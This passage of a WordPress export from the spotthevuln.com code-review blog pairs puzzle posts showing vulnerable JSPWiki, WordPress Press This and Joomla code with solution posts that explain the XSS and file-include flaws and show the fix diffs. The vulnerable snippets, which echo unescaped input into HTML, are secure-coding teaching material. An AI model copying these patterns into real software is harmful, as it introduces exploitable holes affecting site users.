		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[1ab35111f7a2fd5c0a2f703bcf833ea8]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/26615n]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>54</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; XSS Vulnerability in JSPWiki]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/11/xss-kis-from-overseas/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-11-13 08:17:16</wp:comment_date>
			<wp:comment_date_gmt>2009-11-13 15:17:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Ki&#039;s from overseas - XSS</title>
		<link>http://spotthevuln.com/2009/11/xss-kis-from-overseas/</link>
		<pubDate>Fri, 13 Nov 2009 15:00:58 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=543</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: JSPWiki</strong>

<strong>Fixed in Version: 2.60</strong>

<strong>Issue Type: Cross Site Scripting
</strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/11/vulnerable-code-keys-from-oversea/">Found Here</a>
<h2>Description</h2>
The vulnerable code from JSPWiki contained persistent Cross Site Scripting vulnerabilities.  Although we cannot see the call to session.setAttribute(), we can see that the author, link, and remember values were not sanitized before being used in FORM input fields.  The exposure was fixed by using “c:out”.  c:out is part of the JSP Standard Tag Library (JSTL) and is used to output to the current JspWriter.  If the “escapeXML” attribute is set to “true” (which is the default value), c:out will escape some HTML characters, helping to reduce the possibility of XSS.  By default, c:out encodes the following characters: &lt;, &gt;, &amp;, ", and '.

This week’s code sample brings up the old application security argument as to whether it’s better to sanitize input as it arrives or to escape data at the point of consumption (or as near to the point of consumption as possible).  There are pros and cons for both methods.  In this case, the JSPWiki developers chose to encode at the point of consumption.  If the author, link, and remember values were instead sanitized when being assigned to the session store, the developers would have also prevented the XSS exposure… so which is better?

From a security code review perspective, encoding data at the point of entry requires additional flow analysis, as the code reviewer has to follow the data from the point of consumption back to assignment in order to ensure it hasn’t been tainted along the way before being consumed.  Sanitizing input as it arrives can be challenging as it may be difficult to determine how best to sanitize incoming data if that data is to be used in diverse ways throughout the application (inserted into a database, output to HTML, used in LDAP queries, used as part of a mail API…etc.).  This typically results in more generic forms of sanitization routines which may not stand up to targeted or sophisticated attacks.  Sanitizing data as it arrives does offer the advantage of being able to sanitize a particular piece of data once, as opposed to tracking down each instance of consumption and sanitizing at the points of consumption.

Sanitizing at the point of consumption offers advantages as the developer has a clear understanding as to how the data will be used (inserted into a database, output to HTML, used in LDAP queries, used as part of a mail API…etc.) and can implement the best sanitization routine for the situation.  From a security code review perspective, code that sanitizes at the point of consumption requires less flow analysis as each consumption point can be evaluated independently of other consumption points.  This independence comes at a cost as each point of consumption must now be evaluated in order to ensure the proper sanitization is being put in place.  A single missed consumption point will likely result in the introduction of a vulnerability in the application.

It’s also interesting seeing the vulnerable code sample has comments related to Edit.jsp and Comment.jsp.  It seems the conditionals for these two JSP files may not be very robust and could be an interesting avenue for attack.  I’m also curious as to whether this particular FORM has a robust CSRF token…
<h2>Developers Solution</h2>
[cce lang="diff"]
&lt;% if( usertext == null ) usertext = ""; %&gt;
&lt;%
String action = "comment".equals(request.getParameter("action")) ?
context.getURL(WikiContext.COMMENT,context.getName()) :
context.getURL(WikiContext.EDIT,context.getName());
%&gt;
&lt;form accept-charset="&lt;wiki:ContentEncoding/&gt;" method="post"
action="&lt;%=action%&gt;"
name="editForm" enctype="application/x-www-form-urlencoded"&gt;
&lt;p&gt;
&lt;%-- Edit.jsp &amp; Comment.jsp rely on these being found.  So be careful, if you make changes. --%&gt;
-&lt;input name="author" type="hidden" value="&lt;%=session.getAttribute("author")%&gt;" /&gt;
-&lt;input name="link" type="hidden" value="&lt;%=session.getAttribute("link")%&gt;" /&gt;
-&lt;input name="remember" type="hidden" value="&lt;%=session.getAttribute("remember")%&gt;" /&gt;
+&lt;input type="hidden" name="author" value="&lt;c:out value='${author}' /&gt;" /&gt;
+&lt;input type="hidden" name="link" value="&lt;c:out value='${link}' /&gt;" /&gt;
+    &lt;input type="hidden" name="remember" value="&lt;c:out value='${remember}' /&gt;" /&gt;

&lt;input name="page" type="hidden" value="&lt;wiki:Variable var="pagename"/&gt;" /&gt;
&lt;input name="action" type="hidden" value="save" /&gt;
-        &lt;input name="edittime" type="hidden" value="&lt;%=pageContext.getAttribute("lastchange",
PageContext.REQUEST_SCOPE )%&gt;" /&gt;
-        &lt;input name="addr" type="hidden" value="&lt;%=request.getRemoteAddr()%&gt;" /&gt;
+    &lt;input name="&lt;%=SpamFilter.getHashFieldName(request)%&gt;" type="hidden" value="&lt;c:out value='${lastchange}' /&gt;" /&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>543</wp:post_id>
		<wp:post_date>2009-11-13 08:00:58</wp:post_date>
		<wp:post_date_gmt>2009-11-13 15:00:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>xss-kis-from-overseas</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="jspwiki"><![CDATA[JSPWiki]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#XSS #JSPWiki]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability in JSPWiki]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/3VRNkM]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[fd5f50f342d8d5d02f6fc76713973e1b]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Leather Straps</title>
		<link>http://spotthevuln.com/2009/12/leather-straps/</link>
		<pubDate>Mon, 14 Dec 2009 15:00:53 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=590</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Some mornings, it's just not worth chewing through the leather straps

- Emo Phillips</blockquote>
[ccnLe_php]

&lt;%php

...

$title = isset($_GET['t']) ? esc_html(aposfix(stripslashes($_GET['t']))) : '';

$selection = isset($_GET['s']) ? trim( aposfix( stripslashes($_GET['s']) ) ) : '';

if ( ! empty($selection) ) {

$selection = preg_replace('/(\r?\n|\r)/', '&lt;/p&gt;&lt;p&gt;', $selection);

}

...

&lt;h2&gt;&lt;label for="embed-code"&gt;&lt;?php _e('Embed Code') ?&gt;&lt;/label&gt;&lt;/h2&gt;

&lt;div class="inside"&gt;

&lt;textarea name="embed-code" id="embed-code" rows="8" cols="40"&gt;&lt;?php echo format_to_edit($selection, true); ?&gt;&lt;/textarea&gt;

&lt;p id="options"&gt;&lt;a href="#" class="select button"&gt;&lt;?php _e('Insert Video'); ?&gt;&lt;/a&gt; &lt;a href="#" class="close button"&gt;&lt;?php _e('Cancel'); ?&gt;&lt;/a&gt;&lt;/p&gt;

&lt;/div&gt;

...

&lt;div class="editor-container"&gt;

&lt;textarea name="content" id="content" style="width:100%;" class="mceEditor" rows="15"&gt;

&lt;?php if ($selection) echo wp_richedit_pre(htmlspecialchars_decode($selection)); ?&gt;

&lt;?php if ($url) { echo '&lt;p&gt;'; if($selection) _e('via '); echo "&lt;a href='$url'&gt;$title&lt;/a&gt;."; echo '&lt;/p&gt;'; } ?&gt;

&lt;/textarea&gt;

&lt;/div&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>590</wp:post_id>
		<wp:post_date>2009-12-14 08:00:53</wp:post_date>
		<wp:post_date_gmt>2009-12-14 15:00:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>leather-straps</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[leather-straps-week-19]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Leather Straps]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Leather Straps]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[b12f13cf65bd9b0bc982adc42eae5e71]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aHkxTJ]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>330</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com» Leather Straps – XSS]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/12/leather-straps-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-12-18 09:33:03</wp:comment_date>
			<wp:comment_date_gmt>2009-12-18 16:33:03</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Leather Straps – XSS</title>
		<link>http://spotthevuln.com/2009/12/leather-straps-xss/</link>
		<pubDate>Fri, 18 Dec 2009 16:32:57 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=601</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: Press This component for WordPress
</strong>

<strong>Fixed in Version: 2.8.6</strong>

<strong>Issue Type: Cross Site Scripting
</strong>

<strong>Original Code: </strong><a title="Leather Straps" href="http://spotthevuln.com/2009/12/leather-straps/" target="_blank">Found Here</a>
<h2>Description</h2>
This was a cross site scripting bug affecting the Press This component for WordPress.  The developers fixed several XSS bugs in this single code change.  I find two things that are interesting in this code change. First, all the XSS bugs seem to be fixed using different encoding functions.  $title now has strip_tags applied, while $selection has htmlspecialchars() AND html_entity_decode() applied!  Later we see wp_htmledit_pre() used to encode output in one place and wp_richedit_pre() used a few lines down.  We also see see esc_html() used to escape output for the same variable in the same code change.  These kinds of deltas make code maintenance difficult, as the developer (and tester) has to understand why the particular encoding methods were applied for each situation and what the differences between the encoding methods exist.  The second item I find interesting in this fix has to do with the original, vulnerable code.  If we take a look at the following line of source that was removed:
<blockquote>&lt;?php if ($selection) echo wp_richedit_pre(htmlspecialchars_decode($selection)); ?&gt;</blockquote>
Here we see that the develop explicitly used the htmlspecialchars_decode() function before echoing the contents of $selection to the user.  This could be an indication that this particular developer doesn’t understand the code symptoms that introduce XSS as it takes an otherwise safe code segment and makes it more vulnerable to XSS conditions.  Conditions like this are good justification to provide some targeted training to this particular group or even individual developer.
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php

-$title = isset($_GET['t']) ? esc_html(aposfix(stripslashes($_GET['t']))) : '';
-$selection = isset($_GET['s']) ? trim( aposfix( stripslashes($_GET['s']) ) ) : '';
+$title = isset( $_GET['t'] ) ? trim( strip_tags( aposfix( stripslashes( $_GET['t'] ) ) ) ) : '';
+$selection = isset( $_GET['s'] ) ? trim( htmlspecialchars( html_entity_decode( aposfix( stripslashes( $_GET['s'] ) ) ) ) ) : '';

if ( ! empty($selection) ) {
$selection = preg_replace('/(\r?\n|\r)/', '&lt;/p&gt;&lt;p&gt;', $selection);
}

...

&lt;h2&gt;&lt;label for="embed-code"&gt;&lt;?php _e('Embed Code') ?&gt;&lt;/label&gt;&lt;/h2&gt;
&lt;div&gt;
-        &lt;textarea name="embed-code" id="embed-code" rows="8" cols="40"&gt;&lt;?php echo format_to_edit($selection, true); ?&gt;&lt;/textarea&gt;
+        &lt;textarea name="embed-code" id="embed-code" rows="8" cols="40"&gt;&lt;?php echo wp_htmledit_pre( $selection ); ?&gt;&lt;/textarea&gt;
&lt;p id="options"&gt;&lt;a href="#"&gt;&lt;?php _e('Insert Video'); ?&gt;&lt;/a&gt; &lt;a href="#"&gt;&lt;?php _e('Cancel'); ?&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

...

&lt;div&gt;
&lt;textarea name="content" id="content" style="width:100%;" rows="15"&gt;
-        &lt;?php if ($selection) echo wp_richedit_pre(htmlspecialchars_decode($selection)); ?&gt;
-        &lt;?php if ($url) { echo '&lt;p&gt;'; if($selection) _e('via '); echo "&lt;a href='$url'&gt;$title&lt;/a&gt;."; echo '&lt;/p&gt;'; } ?&gt;
+        &lt;?php if ($selection) echo wp_richedit_pre( $selection ); ?&gt;
+        &lt;?php if ($url) { echo '&lt;p&gt;'; if($selection) _e('via '); printf( "&lt;a href='%s'&gt;%s&lt;/a&gt;.", esc_url( $url ), esc_html( $title ) ); echo '&lt;/p&gt;'; } ?&gt;
&lt;/textarea&gt;
&lt;/div&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>601</wp:post_id>
		<wp:post_date>2009-12-18 09:32:57</wp:post_date>
		<wp:post_date_gmt>2009-12-18 16:32:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>leather-straps-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Leather Straps – XSS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Cross Site Scripting affecting the Press This WordPress plugin]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c5h5g2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9172d2b4f059f68368c7875a22f0a51c]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Madman</title>
		<link>http://spotthevuln.com/2009/12/madman/</link>
		<pubDate>Mon, 21 Dec 2009 15:00:43 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=605</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><span>The only difference between me and a madman is that I am not mad.</span>

- <span>Salvador Dali</span></blockquote>
[ccnLe_php]

// Set flag that this is a parent file
define( '_VALID_MOS', 1 );

if (!file_exists( '../configuration.php' )) {
header( 'Location: ../installation/index.php' );
exit();
}

require( '../globals.php' );
require_once( '../configuration.php' );

// SSL check - $http_host returns &lt;live site url&gt;:&lt;port number if it is 443&gt;
$http_host = explode(':', $_SERVER['HTTP_HOST'] );
if( (!empty( $_SERVER['HTTPS'] ) &amp;&amp; strtolower( $_SERVER['HTTPS'] ) != 'off' || isset( $http_host[1] ) &amp;&amp; $http_host[1] == 443) &amp;&amp; substr( $mosConfig_live_site, 0, 8 ) != 'https://' ) {
$mosConfig_live_site = 'https://'.substr( $mosConfig_live_site, 7 );
}

require_once( '../includes/joomla.php' );
include_once ( $mosConfig_absolute_path . '/language/'. $mosConfig_lang .'.php' );

//Installation sub folder check, removed for work with SVN
if (file_exists( '../installation/index.php' ) &amp;&amp; $_VERSION-&gt;SVN == 0) {
define( '_INSTALL_CHECK', 1 );
include ($mosConfig_absolute_path .'/offline.php');
exit();
}

$option = strtolower( strval( mosGetParam( $_REQUEST, 'option', NULL ) ) );

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>605</wp:post_id>
		<wp:post_date>2009-12-21 08:00:43</wp:post_date>
		<wp:post_date_gmt>2009-12-21 15:00:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>madman</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[29be87a1feaef1291272666486da4499]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d8VU9d]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code - PHP]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you spot the vulnerability in this piece of PHP code?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Madman]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Madman]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>358</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Madman &#8211; File Include ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2009/12/madman-file-include/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2009-12-25 10:12:38</wp:comment_date>
			<wp:comment_date_gmt>2009-12-25 17:12:38</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Madman - File Include</title>
		<link>http://spotthevuln.com/2009/12/madman-file-include/</link>
		<pubDate>Fri, 25 Dec 2009 17:12:34 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=616</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: Joomla
</strong>

<strong>Fixed in Version: Directory Revision 10041
</strong>

<strong>Issue Type: File Include Vulnerability
</strong>

<strong>Original Code: </strong><a title="Madman" href="http://spotthevuln.com/2009/12/madman/" target="_blank">Found Here</a>
<h2>Description</h2>
This particular vulnerability affected Joomla.  The vulnerable code had symptoms which could allow for a file inclusion vulnerability (under certain circumstances).  PHP based applications are especially vulnerable to remote file due to extensive use of file includes and common PHP server configurations.

File include vulnerabilities give the attacker the ability to execute arbitrary commands on the web server, resulting in the complete compromise of the Joomla installation.  The PHP include(), require(), include_once() and require_once() functions are great candidates for remote file include attacks and in this case we see that the Joomla code base makes use of require_once() function.

Although the Joomla developers checked in a code change which changed the require_once() function to a require(), the real fix will be a configuration change for the PHP server (turning register_globals off).  What’s a bit surprising is the Joomla checked in a code change which was designed to prevent a file include vulnerability but changed the require_once() function to a require() function.  Typically, file inclusion vulnerabilities are fixed by changing a require() function call to an require_once() function call and explicitly loading the required library before the attacker has a chance to influence the file inclusion.  Once again, the authors of this blog are not responsible for the code fixes checked into the software branch :)

It is also interesting that we see a call to the include() function, which remained unchanged:
<blockquote>include ($mosConfig_absolute_path .'/offline.php');</blockquote>
<h2>Developers Solution</h2>
[cce lang="diff"]

// Set flag that this is a parent file
define( '_VALID_MOS', 1 );

if (!file_exists( '../configuration.php' )) {
header( 'Location: ../installation/index.php' );
exit();
}

require( '../globals.php' );
-require_once( '../configuration.php' );
+require( '../configuration.php' );

// SSL check - $http_host returns &lt;live site url&gt;:&lt;port number if it is 443&gt;
$http_host = explode(':', $_SERVER['HTTP_HOST'] );
if( (!empty( $_SERVER['HTTPS'] ) &amp;&amp; strtolower( $_SERVER['HTTPS'] ) != 'off' || isset( $http_host[1] ) &amp;&amp; $http_host[1] == 443) &amp;&amp; substr( $mosConfig_live_site, 0, 8 ) != 'https://' ) {
$mosConfig_live_site = 'https://'.substr( $mosConfig_live_site, 7 );
}

require_once( '../includes/joomla.php' );
include_once ( $mosConfig_absolute_path . '/language/'. $mosConfig_lang .'.php' );

//Installation sub folder check, removed for work with SVN
if (file_exists( '../installation/index.php' ) &amp;&amp; $_VERSION-&gt;SVN == 0) {
define( '_INSTALL_CHECK', 1 );
include ($mosConfig_absolute_path .'/offline.php');
exit();
}

$option = strtolower( strval( mosGetParam( $_REQUEST, 'option', NULL ) ) );

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>616</wp:post_id>
		<wp:post_date>2009-12-25 10:12:34</wp:post_date>
		<wp:post_date_gmt>2009-12-25 17:12:34</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>madman-file-include</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="file-inclusion"><![CDATA[File Inclusion]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[eb3ebc9cad7c08cee9639a1fb3fd2207]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aaWiOL]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
